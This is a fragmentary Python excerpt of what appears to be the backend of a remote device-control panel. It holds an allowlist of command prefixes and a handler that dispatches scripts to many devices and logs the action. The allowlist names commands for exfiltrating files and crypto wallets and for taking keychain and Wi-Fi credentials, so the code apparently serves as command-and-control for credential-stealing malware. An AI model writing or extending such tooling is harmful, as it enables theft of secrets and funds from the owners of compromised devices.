...
from ..database import get_db, Command, Device, CommandScript, create_audit_log
...
ALLOWED_CMD_PREFIXES: Set[str] = {
    ...
    "ds_exfil_files", "ds_exfil_wallet", "ds_keychain", "ds_wifi",
...
async def run_script(request: Request, script_id: int, body: Optional[dict] = None, otp_code: str = "",
    ...
    create_audit_log(db, username=username, action="script_run", resource_type="command_script",
                     ...
                     detail=f"Ran script '{db_script.name}' on {len(device_uuids)} devices, {created_count} commands queued",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Script dispatched", "devices": len(device_uuids), "commands_queued": created_count}
